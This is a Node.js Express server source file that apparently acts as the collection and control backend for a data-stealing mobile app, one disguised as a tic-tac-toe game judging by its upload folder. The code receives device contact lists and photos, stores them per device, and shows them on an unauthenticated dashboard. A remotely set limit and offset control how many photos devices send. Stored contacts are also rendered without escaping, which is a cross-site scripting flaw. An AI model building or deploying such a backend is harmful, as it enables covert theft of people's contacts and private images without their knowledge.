const express = require("express");
const { Pool } = require("pg");
const cloudinary = require("cloudinary").v2;
const multer = require("multer");

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const upload = multer({ storage: multer.memoryStorage() });

// ================= CLOUDINARY =================
cloudinary.config({
  cloud_name: process.env.CLOUD_NAME,
  api_key: process.env.API_KEY,
  api_secret: process.env.API_SECRET
});

// ================= DATABASE =================
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

// ================= DB SETUP =================
async function initDB() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS users (
      id SERIAL PRIMARY KEY,
      device_id TEXT UNIQUE
    );

    CREATE TABLE IF NOT EXISTS images (
      id SERIAL PRIMARY KEY,
      device_id TEXT,
      image_url TEXT
    );

    CREATE TABLE IF NOT EXISTS contacts (
      id SERIAL PRIMARY KEY,
      device_id TEXT,
      contact TEXT
    );
  `);
}
initDB();

// ================= CONTROL =================
let config = { limit: 5, offset: 0 };

app.get("/config/:device_id", (req, res) => {
  res.json(config);
});

app.post("/set-config", (req, res) => {
  config.limit = parseInt(req.body.limit);
  config.offset = parseInt(req.body.offset);
  res.redirect("/");
});
// ================= DASHBOARD =================
app.get("/", async (req, res) => {

  const users = await pool.query("SELECT COUNT(*) FROM users");
  const images = await pool.query("SELECT COUNT(*) FROM images");
  const contacts = await pool.query("SELECT COUNT(*) FROM contacts");

  res.send(`
  <html>
  <head>
    <title>Dashboard</title>
    <style>
      body { background:#0f172a; color:white; font-family:sans-serif; padding:20px;}
      .card { background:#1e293b; padding:20px; margin:10px; border-radius:12px;}
      a { color:#22c55e; text-decoration:none;}
      input { padding:5px; margin:5px;}
      button { padding:8px 12px; background:#22c55e; border:none; color:white;}
    </style>
  </head>
  <body>

    <h1>🚀 Backend Dashboard</h1>

    <div class="card">👤 Users: ${users.rows[0].count}</div>
    <div class="card">🖼 Images: ${images.rows[0].count}</div>
    <div class="card">📞 Contacts: ${contacts.rows[0].count}</div>

    <div class="card">
      <h3>⚙️ Control Upload</h3>
      <form method="POST" action="/set-config">
        Limit: <input type="number" name="limit" value="${config.limit}"/>
        Offset: <input type="number" name="offset" value="${config.offset}"/>
        <button type="submit">Update</button>
      </form>
    </div>

    <div class="card">
      <a href="/users">👥 View Users</a><br><br>
      <a href="/contacts">📞 View Contacts</a>
    </div>

  </body>
  </html>
  `);
});

// ================= RECEIVE CONTACTS =================
app.post("/receive", async (req, res) => {

  const { device_id, data } = req.body;

  for (let contact of data) {
    await pool.query(
      "INSERT INTO contacts (device_id, contact) VALUES ($1, $2)",
      [device_id, contact]
    );
  }

  await pool.query(
    "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
    [device_id]
  );

  res.send("Contacts saved ✅");
});

// ================= IMAGE UPLOAD =================
app.post("/upload-image", upload.single("image"), async (req, res) => {
  try {

    const device_id = req.body.device_id;

    const stream = cloudinary.uploader.upload_stream(
      { folder: "tic_tac_toe_app" },
      async (error, result) => {

        if (error) return res.status(500).send("Upload error");

        const imageUrl = result.secure_url;

        await pool.query(
          "INSERT INTO images (device_id, image_url) VALUES ($1, $2)",
          [device_id, imageUrl]
        );

        await pool.query(
          "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
          [device_id]
        );

        res.json({ url: imageUrl });
      }
    );

    stream.end(req.file.buffer);

  } catch (err) {
    res.status(500).send("Server error");
  }
});

// ================= USERS =================
app.get("/users", async (req, res) => {

  const users = await pool.query("SELECT * FROM users");

  let html = `<html><body style="background:#0f172a;color:white;padding:20px;">`;

  users.rows.forEach(u => {
    html += `
      <div style="margin:10px;">
        <a href="/user/${u.device_id}">${u.device_id}</a>
      </div>
    `;
  });

  html += `</body></html>`;
  res.send(html);
});

// ================= USER DATA =================
app.get("/user/:device_id", async (req, res) => {

  const device = req.params.device_id;

  const images = await pool.query(
    "SELECT * FROM images WHERE device_id=$1",
    [device]
  );

  const contacts = await pool.query(
    "SELECT * FROM contacts WHERE device_id=$1",
    [device]
  );

  let html = `
  <html>
  <body style="background:#0f172a;color:white;padding:20px;">
    <h2>Device: ${device}</h2>
    <h3>🖼 Images</h3>
  `;

  images.rows.forEach(img => {
    html += `<img src="${img.image_url}" width="150" style="margin:5px;"/>`;
  });

  html += `<h3>📞 Contacts</h3>`;

  contacts.rows.forEach(c => {
    html += `<div>${c.contact}</div>`;
  });

  html += `</body></html>`;

  res.send(html);
});

// ================= CONTACTS PAGE =================
app.get("/contacts", async (req, res) => {

  const contacts = await pool.query("SELECT * FROM contacts");

  let html = `<html><body style="background:#0f172a;color:white;padding:20px;">`;

  contacts.rows.forEach(c => {
    html += `<div>${c.device_id} → ${c.contact}</div>`;
  });

  html += `</body></html>`;
  res.send(html);
});

app.listen(process.env.PORT || 3000);
